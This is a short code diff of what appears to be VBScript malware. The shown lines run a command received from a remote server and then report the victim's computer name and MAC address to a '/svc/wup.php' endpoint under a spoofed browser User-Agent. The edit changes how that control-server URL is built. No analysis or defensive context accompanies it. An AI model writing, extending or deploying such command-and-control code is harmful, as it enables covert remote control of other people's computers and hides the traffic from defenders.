@@ -55,7 +55,7 @@ dim arr
       if (right(arr(7),1)=1) then
         oShell.run right(arr(8),len(arr(8))-4)
           
-        xmlhttp.open "get", "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac&"&exec=0", false
+        xmlhttp.open "get", x&"/svc/wup.php?pc="&strComputerName&"_"&mac&"&exec=0", false
         xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"
         xmlhttp.send
       end if
